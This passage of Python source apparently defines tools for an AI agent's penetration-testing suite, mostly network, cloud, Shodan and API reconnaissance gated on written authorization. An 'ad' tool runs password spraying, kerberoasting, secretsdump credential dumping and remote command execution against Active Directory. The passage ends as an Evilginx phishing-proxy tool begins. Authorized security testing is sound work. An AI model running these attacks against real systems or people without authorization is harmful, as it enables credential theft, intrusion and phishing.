            "if [ -s \"$TMP\" ]; then "
            "H=$(cut -d: -f1 \"$TMP\" | sort -u | paste -sd, -); "
            "P=$(cut -d: -f2 \"$TMP\" | sort -un | paste -sd, -); "
            "nmap -sV -Pn -n -p \"$P\" $H 2>/dev/null | grep -E 'Nmap scan report|/tcp|/udp'; "
            "else echo '(no open ports found in range)'; fi; rm -f \"$TMP\""
        )
        need = ["naabu", "nmap"]
        timeout = min(OFFENSIVE_TIMEOUT, 1800)
    else:
        return "cidr_scan: 'mode' must be discover | ports | full."
    if extra:
        cmd += " " + extra
    out, rc, where = _off_run(cmd, timeout, need=need)
    return _off_report("cidr_scan(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target=target)


# 8. netenum — SMB / SNMP / service enumeration on an authorized host
def tool_netenum(args: dict) -> str:
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    svc = str(args.get("service", "smb")).lower()
    t = shlex.quote(target)
    if svc == "snmp":
        cmd = f"onesixtyone {t} public 2>/dev/null; echo '=='; snmpwalk -v2c -c public -Cc {t} 2>/dev/null | head -60"
    else:  # smb
        cmd = (f"echo '== enum4linux-ng =='; enum4linux-ng -A {t} 2>/dev/null | head -120; "
               f"echo '== smbmap =='; smbmap -H {t} 2>/dev/null | head -40; "
               f"echo '== nxc =='; nxc smb {t} --shares 2>/dev/null | head -40")
    out, rc, where = _off_run(cmd, 600)
    return _off_report("netenum(" + svc + ")", args.get("authorization", ""), cmd, out, rc, where)


# 9. pw_strength — local strength estimate + HaveIBeenPwned breach check.
#    The password is NEVER sent: only the first 5 chars of its SHA-1 hash (HIBP
#    k-anonymity). Purely a defensive self-test.
def tool_pw_strength(args: dict) -> str:
    pw = str(args.get("password", "") or args.get("pw", ""))
    if not pw:
        return ("pw_strength: give a 'password' to test. It is checked LOCALLY; only a 5-char "
                "SHA-1 prefix is sent to HaveIBeenPwned, never the password itself.")
    cs = (26 if re.search(r"[a-z]", pw) else 0) + (26 if re.search(r"[A-Z]", pw) else 0) \
        + (10 if re.search(r"\d", pw) else 0) + (33 if re.search(r"[^A-Za-z0-9]", pw) else 0)
    entropy = round(len(pw) * math.log2(cs), 1) if cs else 0.0
    verdict = ("very weak" if entropy < 28 else "weak" if entropy < 36
               else "reasonable" if entropy < 60 else "strong" if entropy < 128 else "very strong")
    notes = []
    if len(pw) < 12:
        notes.append("under 12 chars — length matters most")
    if re.fullmatch(r"[a-z]+|\d+", pw):
        notes.append("single character class")
    if re.search(r"(.)\1\1", pw):
        notes.append("repeated characters")
    h = hashlib.sha1(pw.encode()).hexdigest().upper()
    body, status, _ = _http_get(HIBP_RANGE + h[:5], headers={"User-Agent": _BROWSER_UA, "Add-Padding": "true"})
    breached = 0
    for line in (body or "").splitlines():
        p = line.strip().split(":")
        if len(p) == 2 and p[0] == h[5:]:
            breached = int(p[1])
            break
    out = [f"Password strength (length {len(pw)}): {verdict}  (~{entropy} bits, charset {cs})"]
    if notes:
        out.append("  weaknesses: " + "; ".join(notes))
    if breached:
        out.append(f"  ⚠ BREACHED: seen {breached:,} times in known breaches (HIBP) — do NOT use it.")
    else:
        out.append("  not found in HIBP breach corpus (good, but that alone doesn't make it strong).")
    return "\n".join(out)


# 10. cell_info — DEFENSIVE cellular: own modem serving cell + tower lookup +
#     IMSI-catcher detection guidance. No transmitting / no interception.
def tool_cell_info(args: dict) -> str:
    mode = str(args.get("mode", "serving")).lower()
    if mode == "lookup":
        for k in ("mcc", "mnc", "lac", "cellid"):
            if not str(args.get(k, "")).strip():
                return "cell_info lookup: give mcc, mnc, lac, cellid (from a tower you can see). Needs OPENCELLID_API_KEY."
        if not OPENCELLID_KEY:
            return "cell_info lookup: set OPENCELLID_API_KEY (free at opencellid.org) to geolocate a cell tower."
        qs = urllib.parse.urlencode({"key": OPENCELLID_KEY, "mcc": args["mcc"], "mnc": args["mnc"],
                                     "lac": args["lac"], "cellid": args["cellid"], "format": "json"})
        body, status, err = _http_get(OPENCELLID + "?" + qs, headers={"User-Agent": _BROWSER_UA})
        return f"OpenCellID lookup (HTTP {status}):\n{body[:600]}" if body else f"cell_info: {err}"
    if mode == "detect":
        return ("IMSI-catcher / rogue-base-station DETECTION (defensive):\n"
                "- Watch for a sudden drop to 2G/GSM, a new unknown CellID with strong signal, or "
                "  cipher downgrade. Tools: SnoopSnitch (rooted Android) or Crocodile Hunter (SDR).\n"
                "- Compare the serving CellID/LAC against OpenCellID for the area (mode=lookup).\n"
                "- This tool only OBSERVES your own link. Transmitting on cellular bands or "
                "intercepting others' traffic is illegal and not provided.")
    # serving: read the OWN modem via ModemManager
    if _run_host("command -v mmcli", 10)[1] != 0:
        return ("cell_info serving: ModemManager (mmcli) not found. It reads YOUR OWN modem's "
                "serving cell (operator, tech, signal, cell id). Install: apt install modemmanager.")
    cmd = ("m=$(mmcli -L 2>/dev/null | grep -oE '/Modem/[0-9]+' | head -1); "
           "[ -n \"$m\" ] && mmcli -m \"$m\" 2>/dev/null | grep -iE 'operator|access tech|signal|state|3gpp|registration' "
           "&& mmcli -m \"$m\" --location-get 2>/dev/null | grep -iE 'cell|lac|mcc|mnc|operator' "
           "|| echo 'no modem found via ModemManager'")
    out, rc = _run_host(cmd, 30)
    return _off_report("cell_info(serving, own modem)", "own device", "mmcli serving cell", out, rc, "host")


# --- Further ethical-hacking tools: containers, visual/AD/cloud recon,
#     crypto/encoding, website utilities --------------------------------------
import base64 as _b64
import hmac as _hmac


# 1. container_scan — trivy: images, filesystems, repos, IaC (+ secrets/CVEs)
def tool_container_scan(args: dict) -> str:
    tgt = str(args.get("target", "") or args.get("image", "") or ".").strip()
    kind = str(args.get("type", "")).strip().lower()
    if not kind:
        kind = "image" if ("/" in tgt or ":" in tgt) and not os.path.exists(os.path.expanduser(tgt)) else "fs"
    if kind == "image":
        cmd = f"trivy image --scanners vuln,secret,misconfig --quiet {shlex.quote(tgt)} 2>&1 | head -200"
        out, rc, where = _off_run(cmd, 900)
        if rc != 0 and not _have("trivy"):
            return "container_scan needs trivy in the toolbox — run `sygnif kali-setup`, or install trivy."
        return _off_report("container_scan(image)", "own image", cmd, out, rc, where)
    # fs / repo / config: files on the host
    sub = {"fs": "fs", "repo": "repo", "config": "config"}.get(kind, "fs")
    tmpl = "trivy " + sub + " --scanners vuln,secret,misconfig --quiet {p} 2>&1 | head -200"
    out, rc, where = _local_or_toolbox(tgt, tmpl, "trivy", 900)
    if where.startswith("missing"):
        return "container_scan needs trivy on the host or in the toolbox (`sygnif kali-setup`)."
    return _off_report("container_scan(" + sub + ")", "own code", "trivy " + sub + " " + tgt, out, rc, where)


# 2. webshot — bulk screenshots of authorized hosts (gowitness / eyewitness)
def tool_webshot(args: dict) -> str:
    target = str(args.get("target", "") or args.get("url", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    outdir = "/tmp/webshot_" + str(abs(hash(target)) % 100000)
    u = shlex.quote(target if target.startswith("http") else "https://" + target)
    cmd = (f"mkdir -p {outdir}; (gowitness scan single --url {u} -s {outdir} 2>/dev/null "
           f"|| gowitness single {u} -P {outdir} 2>/dev/null "
           f"|| eyewitness --web --single {u} -d {outdir} --no-prompt 2>/dev/null); "
           f"ls -1 {outdir}/**/*.png {outdir}/*.png 2>/dev/null | head")
    out, rc, where = _off_run(cmd, 300)
    return _off_report("webshot", args.get("authorization", ""),
                       "screenshot " + target + " -> " + outdir, out or "(no output)", rc, where)


# 3. ad_enum — BloodHound collection against an authorized Active Directory
def tool_ad_enum(args: dict) -> str:
    domain = str(args.get("domain", "")).strip()
    g = _authz(args, domain)
    if g:
        return g
    dc = str(args.get("dc", "") or args.get("nameserver", "")).strip()
    user = str(args.get("user", "")).strip()
    pw = str(args.get("password", "")).strip()
    if not (dc and user and pw):
        return ("ad_enum: give domain + 'dc' (DC IP/host) + 'user' + 'password' for an AD you are "
                "authorized to test. Collects BloodHound data (users, groups, ACLs, sessions).")
    outdir = "/tmp/bh_" + str(abs(hash(domain)) % 100000)
    cmd = (f"mkdir -p {outdir}; cd {outdir}; bloodhound-python -d {shlex.quote(domain)} "
           f"-u {shlex.quote(user)} -p {shlex.quote(pw)} -ns {shlex.quote(dc)} -c All --zip 2>&1 | tail -30; "
           f"echo '== output =='; ls -1 {outdir}")
    out, rc, where = _off_run(cmd, 900)
    return _off_report("ad_enum(bloodhound)", args.get("authorization", ""),
                       "bloodhound-python " + domain, out, rc, where)


# 4. cloud_audit — Prowler cloud posture (AWS/GCP/Azure). Needs cloud creds in env.
def tool_cloud_audit(args: dict) -> str:
    provider = str(args.get("provider", "aws")).strip().lower()
    if provider not in ("aws", "gcp", "azure", "kubernetes"):
        return "cloud_audit: provider must be aws | gcp | azure | kubernetes."
    g = _authz(args, provider + "-account")
    if g:
        return g
    extra = str(args.get("extra", "")).strip()
    ensure = ("command -v prowler >/dev/null 2>&1 || pipx install prowler >/dev/null 2>&1 "
              "|| pip install --break-system-packages prowler >/dev/null 2>&1; ")
    cmd = ensure + f"prowler {shlex.quote(provider)} --no-banner {extra} 2>&1 | tail -120"
    out, rc, where = _off_run(cmd, 1800)
    if "command not found" in out or ("prowler" not in out and rc != 0):
        return ("cloud_audit: could not run/install prowler. Provision the toolbox "
                "(`sygnif kali-setup`) or `pipx install prowler`. Cloud creds come from the "
                "environment (AWS: ~/.aws or AWS_* env; GCP: ADC; Azure: az login).")
    return _off_report("cloud_audit(" + provider + ")", args.get("authorization", ""),
                       "prowler " + provider, out, rc, where)


# 5. crypto — encode / decode / hash / hmac / jwt / identify / magic-decrypt.
#    Local, deterministic; identify + magic use the toolbox (hashid/ciphey).
def tool_crypto(args: dict) -> str:
    op = str(args.get("op", "")).strip().lower()
    data = str(args.get("data", "") or args.get("text", ""))
    algo = str(args.get("algo", "") or args.get("scheme", "")).strip().lower()
    key = str(args.get("key", ""))
    if not op:
        return ("crypto: op = encode|decode|hash|hmac|jwt|identify|magic. "
                "encode/decode algo=base64|hex|url|rot13; hash algo=md5|sha1|sha256|sha512; "
                "hmac needs key+algo; jwt decodes a token; identify names a hash; magic auto-decodes (ciphey).")
    try:
        if op == "encode":
            if algo in ("base64", "b64"):
                return _b64.b64encode(data.encode()).decode()
            if algo == "hex":
                return data.encode().hex()
            if algo == "url":
                return urllib.parse.quote(data)
            if algo == "rot13":
                import codecs
                return codecs.encode(data, "rot13")
            return "crypto encode: algo = base64|hex|url|rot13"
        if op == "decode":
            if algo in ("base64", "b64"):
                return _b64.b64decode(data + "=" * (-len(data) % 4)).decode(errors="replace")
            if algo == "hex":
                return bytes.fromhex(data.strip()).decode(errors="replace")
            if algo == "url":
                return urllib.parse.unquote(data)
            if algo == "rot13":
                import codecs
                return codecs.encode(data, "rot13")
            return "crypto decode: algo = base64|hex|url|rot13"
        if op == "hash":
            import hashlib
            algo = algo or "sha256"
            if algo not in hashlib.algorithms_available:
                return f"crypto hash: unknown algo '{algo}'"
            return f"{algo}({len(data)} bytes) = " + hashlib.new(algo, data.encode()).hexdigest()
        if op == "hmac":
            import hashlib
            if not key:
                return "crypto hmac: give a 'key' and algo (default sha256)."
            return f"hmac-{algo or 'sha256'} = " + _hmac.new(key.encode(), data.encode(),
                                                             algo or "sha256").hexdigest()
        if op == "jwt":
            parts = data.strip().split(".")
            if len(parts) < 2:
                return "crypto jwt: not a JWT (need header.payload.signature)."
            def d(seg):
                return _b64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)).decode(errors="replace")
            return ("JWT (decoded, NOT verified):\n  header:  " + d(parts[0])
                    + "\n  payload: " + d(parts[1])
                    + "\n  [signature not checked — decode only]")
        if op == "identify":
            out, rc, where = _off_run("echo " + shlex.quote(data) + " | hashid -m 2>/dev/null | head -20 "
                                      "|| nth -t " + shlex.quote(data) + " 2>/dev/null | head -20", 30)
            return out or "crypto identify: no match (need hashid/name-that-hash in the toolbox)."
        if op == "magic":
            out, rc, where = _off_run("echo " + shlex.quote(data) + " | ciphey -- - 2>/dev/null | head -20", 120)
            return out or "crypto magic: ciphey found nothing (or not installed in the toolbox)."
    except Exception as e:  # noqa: BLE001
        return f"crypto {op}: {type(e).__name__}: {e}"
    return "crypto: unknown op '" + op + "'"


# 6. website — quick site-recon utilities (robots/sitemap/security.txt, DNS,
#    whois, tech, wayback). Passive; a handful of GETs + DNS.
def tool_website(args: dict) -> str:
    url = _norm_url(str(args.get("url", "") or args.get("target", "")))
    if not url:
        return "website: give a 'url'."
    host = _bare_host(url)
    lines = [f"Website recon: {url}"]
    for p in ("/robots.txt", "/sitemap.xml", "/.well-known/security.txt"):
        body, status, _ = _http_get(url + p, headers={"User-Agent": _BROWSER_UA})
        first = (body or "").strip().splitlines()[:3]
        lines.append(f"  {p}: HTTP {status}" + (("  " + " | ".join(first)) if status == 200 and first else ""))
    # wayback snapshot count (keyless CDX)
    wb, wstat, _ = _http_get(
        "https://web.archive.org/cdx/search/cdx?url=" + urllib.parse.quote(host)
        + "*&output=json&fl=original&collapse=urlkey&limit=5000", headers={"User-Agent": _BROWSER_UA})
    n = max(0, len((wb or "").strip().splitlines()) - 1) if wstat == 200 else 0
    lines.append(f"  wayback snapshots (unique URLs): ~{n}")
    # DNS + whois + tech via the toolbox/host
    dq = shlex.quote(host)
    out, rc, where = _off_run(
        f"echo '== dns =='; dig +short A {dq}; dig +short MX {dq}; "
        f"echo '== whois =='; whois {dq} 2>/dev/null | grep -iE 'registrar|creation|expir|name server' | head; "
        f"echo '== tech =='; whatweb -q {dq} 2>/dev/null", 120)
    lines.append(out.strip() if out.strip() else "  (dns/whois/whatweb unavailable)")
    return _truncate("\n".join(lines))


# --- shodan — internet-wide passive intelligence ----------------------------
# Queries Shodan's data ABOUT a host (no packets to the target). Keyless via
# InternetDB (ports, CVEs, hostnames, CPEs); full host lookup / search / dns /
# count when SHODAN_API_KEY is set. Passive OSINT — use on hosts you're allowed
# to research.
SHODAN_API = "https://api.shodan.io"
SHODAN_IDB = "https://internetdb.shodan.io/"


def _shodan_key() -> str:
    return os.environ.get("SHODAN_API_KEY", "").strip()


def tool_shodan(args: dict) -> str:
    op = str(args.get("op", "host")).strip().lower()
    key = _shodan_key()

    def api(path: str):
        sep = "&" if "?" in path else "?"
        return _http_get(SHODAN_API + path + sep + "key=" + urllib.parse.quote(key),
                         headers={"User-Agent": _BROWSER_UA})

    if op in ("host", "lookup", "ip", ""):
        tgt = str(args.get("target", "") or args.get("ip", "") or args.get("domain", "")).strip()
        if not tgt:
            return "shodan host: give a 'target' (IP or domain)."
        ip = tgt
        if not re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", tgt):
            import socket
            try:
                ip = socket.gethostbyname(_bare_host(tgt))
            except Exception as e:  # noqa: BLE001
                return f"shodan: cannot resolve {tgt}: {e}"
        if key:
            body, st, err = api(f"/shodan/host/{ip}")
            if st != 200:
                return f"shodan host {ip}: HTTP {st} {err}".strip()
            try:
                d = json.loads(body)
            except Exception:  # noqa: BLE001
                return "shodan host: bad response."
            ports = d.get("ports", [])
            vulns = list((d.get("vulns") or {}).keys()) if isinstance(d.get("vulns"), dict) else (d.get("vulns") or [])
            prods = sorted({s.get("product", "") for s in d.get("data", []) if s.get("product")})
            return _truncate(
                f"Shodan host {ip} ({d.get('org','?')}, {d.get('country_name','?')}):\n"
                f"  hostnames: {', '.join(d.get('hostnames', [])[:5]) or '-'}\n"
                f"  ports: {sorted(ports)}\n"
                f"  products: {', '.join(prods[:12]) or '-'}\n"
                f"  CVEs: {', '.join(sorted(vulns)) or 'none listed'}\n"
                f"  last update: {d.get('last_update','?')}  [full Shodan API]")
        # keyless InternetDB
        body, st, err = _http_get(SHODAN_IDB + ip, headers={"User-Agent": _BROWSER_UA})
        if st == 404:
            return f"shodan: {ip} not in InternetDB (no recent Shodan scan on record)."
        if st != 200:
            return f"shodan: {err or ('HTTP ' + str(st))}"
        try:
            d = json.loads(body)
        except Exception:  # noqa: BLE001
            return "shodan: bad InternetDB response."
        return _truncate(
            f"Shodan InternetDB {ip} ({', '.join(d.get('hostnames', [])[:4]) or 'no PTR'}):\n"
            f"  ports: {d.get('ports', [])}\n"
            f"  CVEs: {', '.join(d.get('vulns', [])) or 'none listed'}\n"
            f"  cpes: {', '.join(d.get('cpes', [])[:8]) or '-'}\n"
            f"  tags: {d.get('tags', []) or '-'}\n"
            f"  [keyless InternetDB — passive, from Shodan's last scan. Set SHODAN_API_KEY "
            f"for full banners, search and DNS.]")

    if op in ("cve", "cvedb"):
        cid = str(args.get("cve", "") or args.get("id", "")).strip().upper()
        if not re.fullmatch(r"CVE-\d{4}-\d+", cid):
            return "shodan cve: give a 'cve' id, e.g. CVE-2024-3400."
        body, st, err = _http_get("https://cvedb.shodan.io/cve/" + cid, headers={"User-Agent": _BROWSER_UA})
        if st != 200:
            return f"shodan cve {cid}: HTTP {st} (not found?)"
        d = json.loads(body)
        refs = ", ".join((d.get("references") or [])[:3])
        return _truncate(
            f"{d.get('cve_id')}  cvss {d.get('cvss')} (v{d.get('cvss_version')})  "
            f"EPSS {d.get('epss')}  KEV {d.get('kev')}"
            + chr(10) + (d.get("summary") or "").strip()[:400]
            + chr(10) + "  refs: " + refs
            + chr(10) + "  [Shodan CVEDB — keyless. EPSS = exploit-likelihood, KEV = known-exploited.]")
    if op in ("cvesearch", "cves"):
        prod = str(args.get("product", "") or args.get("query", "")).strip()
        if not prod:
            return "shodan cvesearch: give a 'product' (CPE product name, e.g. wordpress, nginx, openssh)."
        kev = "&is_kev=true" if str(args.get("kev", "")).lower() in ("1", "true", "yes") else ""
        qs = ("cves?product=" + urllib.parse.quote(prod) + "&sort_by_epss=true&limit="
              + str(int(args.get("limit", 10))) + kev)
        body, st, err = _http_get("https://cvedb.shodan.io/" + qs, headers={"User-Agent": _BROWSER_UA})
        if st != 200:
            return f"shodan cvesearch '{prod}': HTTP {st} {err}".strip()
        try:
            rows = json.loads(body).get("cves", [])
        except Exception:  # noqa: BLE001
            return "shodan cvesearch: no data (check the product/CPE name)."
        if not rows:
            return f"shodan cvesearch '{prod}': no CVEs (try the exact CPE product name)."
        out = [f"Shodan CVEDB '{prod}' (top by EPSS, keyless):"]
        for c in rows:
            out.append(f"  {c.get('cve_id')}  cvss {c.get('cvss')}  EPSS {c.get('epss')}  "
                       f"KEV {c.get('kev')}  " + (c.get("summary") or "")[:70])
        return _truncate(chr(10).join(out))

    if not key:
        return (f"shodan {op}: needs SHODAN_API_KEY (get one at account.shodan.io). Keyless ops: "
                f"host (InternetDB), cve + cvesearch (CVEDB). search/count/dns need the key.")
    if op == "search":
        q = str(args.get("query", "")).strip()
        if not q:
            return "shodan search: give a 'query' (e.g. 'product:nginx country:CH', 'org:\"...\"')."
        body, st, err = api("/shodan/host/search?query=" + urllib.parse.quote(q) + "&minify=true")
        if st != 200:
            return f"shodan search: HTTP {st} {err}".strip()
        d = json.loads(body)
        out = [f"Shodan search '{q}': {d.get('total', 0)} results (showing up to 15):"]
        for m in d.get("matches", [])[:15]:
            out.append(f"  {m.get('ip_str')}:{m.get('port')}  {m.get('org','')}  "
                       f"{m.get('location',{}).get('country_code','')}  {(m.get('product') or '')}")
        return _truncate("\n".join(out))
    if op == "count":
        q = str(args.get("query", "")).strip()
        body, st, err = api("/shodan/host/count?query=" + urllib.parse.quote(q))
        if st != 200:
            return f"shodan count: HTTP {st} {err}".strip()
        d = json.loads(body)
        facets = d.get("facets", {})
        return f"shodan count '{q}': {d.get('total', 0)}" + (f"\n  facets: {facets}" if facets else "")
    if op == "dns":
        dom = _bare_host(str(args.get("domain", "") or args.get("target", "")))
        body, st, err = api(f"/dns/domain/{dom}")
        if st != 200:
            return f"shodan dns: HTTP {st} {err}".strip()
        d = json.loads(body)
        subs = d.get("subdomains", [])
        return _truncate(f"Shodan DNS {dom}: {len(subs)} subdomains\n  " + ", ".join(subs[:60]))
    if op in ("info", "api-info"):
        body, st, err = api("/api-info")
        return f"shodan api-info: {body[:300]}" if st == 200 else f"shodan info: HTTP {st}"
    if op == "myip":
        body, st, err = api("/tools/myip")
        return f"your external IP (per Shodan): {body.strip()}" if st == 200 else f"shodan myip: HTTP {st}"
    return "shodan: op = host | search | count | dns | info | myip"


# --- api_scan — API security testing (OWASP API Top 10 oriented) -------------
# Modes: discover (surface + params + exposures), spec (schemathesis fuzz an
# OpenAPI/Swagger spec), graphql (graphw00f + introspection), jwt (token analysis
# + weak-secret crack path). Auth-gated; auto-installs the missing bits into the
# toolbox. Logic flaws (BOLA/IDOR/mass-assignment) still need a human — this finds
# surface, spec violations, and the common auth/JWT/GraphQL weak spots.
def tool_api_scan(args: dict) -> str:
    target = _norm_url(str(args.get("target", "") or args.get("url", "")))
    mode = str(args.get("mode", "discover")).strip().lower()

    if mode == "jwt":
        tok = str(args.get("token", "") or args.get("jwt", "")).strip()
        if not tok or tok.count(".") < 2:
            return "api_scan jwt: give a 'token' (header.payload.signature)."
        import base64 as _bb
        def dec(seg):
            return _bb.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)).decode(errors="replace")
        parts = tok.split(".")
        try:
            hdr = json.loads(dec(parts[0]))
        except Exception:  # noqa: BLE001
            return "api_scan jwt: header not valid base64url JSON."
        alg = str(hdr.get("alg", "?"))
        out = ["JWT analysis (decode only, NOT verified):",
               "  header:  " + json.dumps(hdr),
               "  payload: " + dec(parts[1])[:300]]
        if alg.lower() == "none":
            out.append("  ⚠ CRITICAL: alg=none — server may accept unsigned tokens. Forge claims and test.")
        if alg.upper().startswith("HS"):
            out.append("  HS* (HMAC): try a weak-secret crack — write the token to a file and run "
                       "crack {hashfile:<file>, mode:16500, wordlist:...} (hashcat JWT). If it cracks, "
                       "you can re-sign arbitrary claims.")
        if alg.upper().startswith(("RS", "ES", "PS")):
            out.append("  Asymmetric — test alg-confusion (RS256->HS256 using the public key as HMAC secret).")
        if "kid" in hdr:
            out.append("  'kid' present — test kid header injection / path traversal / SQLi in kid.")
        out.append("  Deeper: jwt_tool <token> -M at (all-tests). ("
                   "install: pipx install jwt_tool, or it's in the toolbox after kali-setup.)")
        return _truncate("\n".join(out))

    g = _authz(args, target)
    if g:
        return g

    if mode == "spec":
        spec = str(args.get("spec", "") or target).strip()
        ensure = ("command -v schemathesis >/dev/null 2>&1 || pipx install schemathesis >/dev/null 2>&1 "
                  "|| pip install --break-system-packages schemathesis >/dev/null 2>&1; ")
        cmd = ensure + f"schemathesis run {shlex.quote(spec)} --checks all --max-examples 15 2>&1 | tail -140"
        out, rc, where = _off_run(cmd, 1200)
        return _off_report("api_scan(spec)", args.get("authorization", ""), "schemathesis " + spec, out, rc, where)

    if mode == "graphql":
        ep = shlex.quote(target)
        ensure = ("command -v graphw00f >/dev/null 2>&1 || pipx install graphw00f >/dev/null 2>&1 "
                  "|| pip install --break-system-packages graphw00f >/dev/null 2>&1; ")
        introspect = ('{"query":"{__schema{queryType{name} types{name}}}"}')
        cmd = (ensure + f"echo '== graphw00f =='; graphw00f -d -f -t {ep} 2>&1 | tail -30; "
               f"echo '== introspection (enabled?) =='; curl -s -X POST {ep} "
               f"-H 'content-type: application/json' -d {shlex.quote(introspect)} 2>/dev/null | head -c 500")
        out, rc, where = _off_run(cmd, 300)
        return _off_report("api_scan(graphql)", args.get("authorization", ""), "graphql " + target, out, rc, where)

    # discover (default)
    base = shlex.quote(target)
    probes = " ".join(["/openapi.json", "/swagger.json", "/v3/api-docs", "/api-docs",
                       "/swagger-ui.html", "/graphql", "/api", "/.well-known/openapi.json"])
    cmd = (
        f"echo '== fingerprint =='; whatweb -q {base} 2>/dev/null; wafw00f {base} 2>/dev/null | tail -2; "
        f"echo '== API surface probes =='; for p in {probes}; do "
        f"c=$(curl -s -o /dev/null -w '%{{http_code}}' -m 8 {base}$p); echo \"$p -> $c\"; done; "
        f"echo '== params (arjun) =='; arjun -u {base} -q 2>/dev/null | tail -20; "
        f"echo '== nuclei (api/exposure/auth) =='; nuclei -u {base} -silent -tags exposure,api,swagger,graphql,auth 2>/dev/null | head -40")
    out, rc, where = _off_run(cmd, 900)
    return _off_report("api_scan(discover)", args.get("authorization", ""), "api discover " + target, out, rc, where)


# name -> {desc, args (name->hint), func}

def tool_ad(args: dict) -> str:
    """Active Directory attack EXECUTION against an AUTHORIZED domain (the active
    sibling of ad_enum's BloodHound collection). Drives NetExec + Impacket + Certipy.
    mode = enum | spray | kerberoast | asrep | secretsdump | exec | certipy.
    Requires target (DC/host IP) + authorization; SCOPE.md-confined; the spray path
    rides the blast-radius rate limit. Creds via user/password or user/hash (NTLM)."""
    target = str(args.get("target", "") or args.get("dc", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    mode = str(args.get("mode", "enum")).strip().lower()
    dom = str(args.get("domain", "")).strip()
    user = str(args.get("user", "")).strip()
    pw = str(args.get("password", "")).strip()
    nthash = str(args.get("hash", "")).strip()
    users_file = str(args.get("users", "")).strip()
    t = shlex.quote(target)
    NXC = 'NXC=$(command -v nxc || command -v netexec); [ -n "$NXC" ] || { echo NXC_MISSING; exit 127; }; '
    IMP = 'imp(){ command -v "$1.py" || command -v "impacket-$1" || command -v "impacket-$(echo $1|tr A-Z a-z)"; }; '
    CPY = 'CPY=$(command -v certipy || command -v certipy-ad); [ -n "$CPY" ] || { echo CERTIPY_MISSING; exit 127; }; '
    creds = ""
    if user:
        creds = "-u " + shlex.quote(user) + " "
        if pw:
            creds += "-p " + shlex.quote(pw) + " "
        elif nthash:
            creds += "-H " + shlex.quote(nthash) + " "
    princ = shlex.quote(dom + "/" + user + (":" + pw if pw else ""))

    if mode == "enum":
        cmd = NXC + '"$NXC" smb ' + t + " " + creds + "--shares --users --groups 2>&1 | head -160"
    elif mode == "spray":
        proto = str(args.get("protocol", "smb")).lower()
        pwd = pw or str(args.get("spray_password", "")).strip()
        if not users_file or not pwd:
            return ("ad spray: give 'users' (a user-list path inside the toolbox) and a "
                    "'password'/'spray_password'. One password across many users — rate-limited.")
        cmd = (NXC + '"$NXC" ' + shlex.quote(proto) + " " + t + " -u " + shlex.quote(users_file)
               + " -p " + shlex.quote(pwd) + " --continue-on-success 2>&1 | grep -Ei '\\[\\+\\]|valid|pwned' | head -80")
    elif mode == "kerberoast":
        if not (dom and user):
            return "ad kerberoast: needs domain + user (+ password) with an authorized foothold."
        cmd = (IMP + 'B=$(imp GetUserSPNs); [ -n "$B" ] || { echo IMPACKET_MISSING; exit 127; }; '
               '"$B" ' + princ + " -dc-ip " + t + " -request 2>&1 | tail -80")
    elif mode == "asrep":
        if not dom:
            return "ad asrep: needs domain (+ a 'users' list, or a single 'user')."
        who = ("-usersfile " + shlex.quote(users_file)) if users_file else shlex.quote(dom + "/" + user)
        base = shlex.quote(dom + "/") if users_file else who
        cmd = (IMP + 'B=$(imp GetNPUsers); [ -n "$B" ] || { echo IMPACKET_MISSING; exit 127; }; '
               '"$B" ' + (base if users_file else who) + (" " + who if users_file else "")
               + " -dc-ip " + t + " -no-pass -format hashcat 2>&1 | tail -60")
    elif mode == "secretsdump":
        if not (dom and user):
            return "ad secretsdump: needs domain + user and a password or NTLM hash (DCSync/dump)."
        auth = shlex.quote(dom + "/" + user + (":" + pw if pw else "")) + "@" + t
        hflag = (" -hashes :" + shlex.quote(nthash)) if (nthash and not pw) else ""
        cmd = (IMP + 'B=$(imp secretsdump); [ -n "$B" ] || { echo IMPACKET_MISSING; exit 127; }; '
               '"$B"' + hflag + " " + auth + " 2>&1 | tail -100")
    elif mode == "exec":
        command = str(args.get("command", "whoami")).strip()
        cmd = NXC + '"$NXC" smb ' + t + " " + creds + "-x " + shlex.quote(command) + " 2>&1 | tail -60"
    elif mode in ("certipy", "adcs"):
        if not (dom and user):
            return "ad certipy: needs domain + user (+ password) to enumerate ADCS (ESC1-17)."
        cmd = (CPY + '"$CPY" find -u ' + shlex.quote(user + "@" + dom)
               + (" -p " + shlex.quote(pw) if pw else "") + " -dc-ip " + t
               + " -stdout -vulnerable 2>&1 | tail -120")
    else:
        return ("ad mode = enum | spray | kerberoast | asrep | secretsdump | exec | certipy. "
                "All need an authorized DC/host 'target'.")
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 900))
    for miss, hint in (("NXC_MISSING", "NetExec (nxc)"), ("IMPACKET_MISSING", "impacket"),
                       ("CERTIPY_MISSING", "certipy")):
        if miss in out:
            return ("ad: " + hint + " not installed — `sygnif kali-setup` (kali-tools-windows-resources "
                    "ships netexec/impacket/certipy), or install it in the toolbox.")
    return _off_report("ad(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)



def tool_aitm(args: dict) -> str:
    """Adversary-in-the-Middle phishing SIMULATION for an authorized red-team
    engagement (Evilginx). Manages the AiTM reverse proxy: list phishlets, prepare a
    campaign config, mint a lure URL, and review captured sessions (secrets REDACTED).
    Targets PEOPLE, so it needs an explicit written phishing/social-engineering
    authorization beyond the normal target scope — set 'phishing_authorization'. No
    message is sent to anyone by this tool; delivery is the operator's separate,
    authorized action. mode = phishlets | setup | lure | sessions | status."""
    # kill-switch first (same STOP file as the offensive suite)
    if os.path.exists(STOP_FILE):
        return ("REFUSED: kill-switch active — " + STOP_FILE + " exists. Remove it to resume.")
    pauth = str(args.get("phishing_authorization", "") or args.get("pauth", "")).strip()
    if len(pauth) < 12:
        return ("REFUSED: AiTM phishing targets people, not hosts. Set "
                "'phishing_authorization' to the written attestation that social-engineering / "
                "phishing is explicitly in scope for this engagement (client sign-off, "
                "engagement ref). This is required in addition to the normal target scope.")
    mode = str(args.get("mode", "phishlets")).strip().lower()
    domain = str(args.get("domain", "")).strip()
    phishlet = str(args.get("phishlet", "")).strip()
    EG = ('EG=$(command -v evilginx2 || command -v evilginx); '
          '[ -n "$EG" ] || { echo EVILGINX_MISSING; exit 127; }; ')

    if mode == "phishlets":
